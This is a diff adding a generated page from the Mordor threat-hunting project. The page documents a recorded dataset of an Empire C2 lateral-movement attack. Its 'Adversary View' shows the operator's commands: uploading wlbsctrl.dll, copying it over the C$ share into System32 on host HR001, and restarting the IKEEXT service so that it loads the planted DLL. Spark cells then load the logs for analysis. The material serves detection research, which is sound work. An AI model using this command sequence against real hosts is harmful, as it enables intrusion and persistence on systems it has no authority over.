@@ -1,0 +1,268 @@
+---
+redirect_from:
+  - "/notebooks/small/windows/08-lateral-movement/sd-190403133337"
+interact_link: content/notebooks/small/windows/08_lateral_movement/SD-190403133337.ipynb
+kernel_name: 
+kernel_path: content/notebooks/small/windows/08_lateral_movement
+has_widgets: false
+title: |-
+  SCM and Dll Hijacking IKEEXT
+pagenum: 72
+prev_page:
+  url: /notebooks/small/windows/08_lateral_movement/SD-190518210652.html
+next_page:
+  url: /notebooks/small/linux/linux.html
+suffix: .ipynb
+search: nzbse empire tasked x ikeext dll id agent mordor wlbsctrl run task type dataset shell hr taskshell command execution completed windows simulation file sc exe servicename state winexitcode serviceexitcode checkpoint waithint c upload win notstoppable notpausable ignoresshutdown scm hijacking metadata sd author roberto rodriguez cybrwardg creation date platform environment shire tool script raw githubusercontent com hunters forge master datasets small lateralmovement empirescmdllhijackikeext tar gz description represents adversaries copying remotely replace executed vulnerable hijack adversary view tmp kb taskupload copy system stop stoppending query winshareprocess stopped start startpending xd pid flags explore initialize analytics engine download process get data
+
+comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
+---
+
+    <main class="jupyter-page">
+    <div id="page-info"><div id="page-title">SCM and Dll Hijacking IKEEXT</div>
+</div>
+    <div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<table>
+<thead><tr>
+<th style="text-align:left"></th>
+<th style="text-align:left"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">id</td>
+<td style="text-align:left">SD-190403133337</td>
+</tr>
+<tr>
+<td style="text-align:left">author</td>
+<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
+</tr>
+<tr>
+<td style="text-align:left">creation date</td>
+<td style="text-align:left">19/04/03</td>
+</tr>
+<tr>
+<td style="text-align:left">platform</td>
+<td style="text-align:left">Windows</td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Environment</td>
+<td style="text-align:left">shire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Type</td>
+<td style="text-align:left">C2</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Tool</td>
+<td style="text-align:left">Empire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Script</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Dataset</td>
+<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_scm_dll_hijack_ikeext.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_scm_dll_hijack_ikeext.tar.gz</a></td>
+</tr>
+</tbody>
+</table>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries copying a file remotely to replace the wlbsctrl.dll file which is executed by the IKEEXT (vulnerable to DLL hijack).</p>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
+<pre><code>(Empire: NZB6SE34) &gt; upload /tmp/wlbsctrl.dll
+[*] Tasked agent to upload wlbsctrl.dll, 124 KB
+[*] Tasked NZB6SE34 to run TASK_UPLOAD
+[*] Agent NZB6SE34 tasked with task ID 46
+(Empire: NZB6SE34) &gt; shell COPY .\wlbsctrl.dll \\HR001\C$\Windows\System32\wlbsctrl.dll
+[*] Tasked NZB6SE34 to run TASK_SHELL
+[*] Agent NZB6SE34 tasked with task ID 47
+(Empire: NZB6SE34) &gt; ..Command execution completed.
+
+(Empire: NZB6SE34) &gt; shell sc.exe `\`\HR001 stop IKEEXT
+[*] Tasked NZB6SE34 to run TASK_SHELL
+[*] Agent NZB6SE34 tasked with task ID 48
+(Empire: NZB6SE34) &gt; SERVICE_NAME: IKEEXT 
+      TYPE               : 30  WIN32  
+      STATE              : 3  STOP_PENDING 
+                              (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+      WIN32_EXIT_CODE    : 0  (0x0)
+      SERVICE_EXIT_CODE  : 0  (0x0)
+      CHECKPOINT         : 0x0
+      WAIT_HINT          : 0x1388
+
+..Command execution completed.
+
+(Empire: NZB6SE34) &gt; shell sc.exe `\`\HR001 query IKEEXT
+[*] Tasked NZB6SE34 to run TASK_SHELL
+[*] Agent NZB6SE34 tasked with task ID 49
+(Empire: NZB6SE34) &gt; SERVICE_NAME: IKEEXT 
+      TYPE               : 20  WIN32_SHARE_PROCESS  
+      STATE              : 1  STOPPED 
+      WIN32_EXIT_CODE    : 0  (0x0)
+      SERVICE_EXIT_CODE  : 0  (0x0)
+      CHECKPOINT         : 0x0
+      WAIT_HINT          : 0x0
+
+..Command execution completed.
+
+(Empire: NZB6SE34) &gt; shell sc.exe `\`\HR001 start IKEEXT
+[*] Tasked NZB6SE34 to run TASK_SHELL
+[*] Agent NZB6SE34 tasked with task ID 50
+(Empire: NZB6SE34) &gt; SERVICE_NAME: IKEEXT 
+      TYPE               : 30  WIN32  
+      STATE              : 2  START_PENDING 
+                              (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+      WIN32_EXIT_CODE    : 0  (0x0)
+      SERVICE_EXIT_CODE  : 0  (0x0)
+      CHECKPOINT         : 0x0
+      WAIT_HINT          : 0x7d0
+      PID                : 4500
+      FLAGS              : 
+
+..Command execution completed.
+
+(Empire: NZB6SE34) &gt;</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/lateral_movement/empire_scm_dll_hijack_ikeext.tar.gz&quot;</span>
+<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
+            <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">SELECT channel, COUNT(1)</span>
+<span class="sd">FROM mordorTable</span>
+<span class="sd">GROUPBY channel</span>
+<span class="sd">            &#39;&#39;&#39;</span><span class="p">)</span>
+<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+        
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+ 
+
+
+    </main>
+    
